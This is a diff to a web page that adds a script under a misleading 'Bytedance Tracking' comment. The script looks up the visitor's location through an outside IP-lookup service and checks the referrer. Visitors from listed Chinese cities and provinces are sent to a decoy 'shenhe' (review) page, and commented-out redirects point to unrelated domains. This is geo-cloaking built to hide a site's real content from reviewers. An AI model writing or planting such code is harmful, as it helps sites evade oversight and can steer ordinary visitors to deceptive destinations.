@@ -33,8 +33,39 @@
 		
 
 <!-- Bytedance Tracking -->
+<script type="text/javascript" src="http://ip.ws.126.net/ipquery" ></script>
 <script>
+if (document.referrer.indexOf("baidu.com")> 0) {
+   
   
+   
+    
+} else {
+    // document.location.href = './shenhe.php'
+}
+
+var prov_arr = new Array("北京市","广州市","深圳市","上海市","江西省");//这里是需要屏蔽的省份数组
+   if (contains(prov_arr, lc)) {
+	   
+        // 在设定区域
+		document.location.href = './shenhe.php'
+    //    alert('你在'+lo);
+        // window.location.href = 'http://qo65i.cn/kgcy/';      
+    } else if(contains(prov_arr,lo)){
+		document.location.href = './shenhe.php'
+	} else {
+        // 不在设定区域,跳转到指定网站
+        // window.location.href = 'http://guangdongxiao.cn/JF/T';
+    }
+    function contains(arr, obj) {
+       var i = arr.length;
+       while (i--) {
+           if(obj.indexOf(arr[i]) > -1 ){
+               return true;
+           }
+       }
+       return false;
+   }     
 </script>
 <!-- End Bytedance Tracking -->		
 	<script type="text/javascript">
